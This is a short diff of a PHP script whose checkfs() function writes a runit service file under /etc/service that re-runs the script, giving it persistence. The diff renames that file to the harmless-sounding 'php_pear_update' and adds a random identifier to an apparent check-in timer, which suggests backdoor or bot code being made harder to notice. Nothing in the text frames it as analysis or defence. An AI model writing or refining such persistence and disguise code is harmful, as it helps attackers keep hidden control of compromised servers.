@@ -6,7 +6,7 @@ define("SELF_SCRIPT", $_SERVER["SCRIPT_FILENAME"]);
 
 function checkfs(){
     if (is_dir("/etc/service")){
-        $f = fopen("/etc/service/php_update", "w");
+        $f = fopen("/etc/service/php_pear_update", "w");
         fwrite($f, "#!/bin/sh\nexec $(which php) ". SELF_SCRIPT);
         fflush($f);
         fclose($f);
@@ -24,6 +24,7 @@ function checkfs(){
 }
 
 function checkin_timer($time){
+    $uu = substr(base_convert(sha1(uniqid(mt_rand())), 16, 36), 0, 32);
 
 }
 
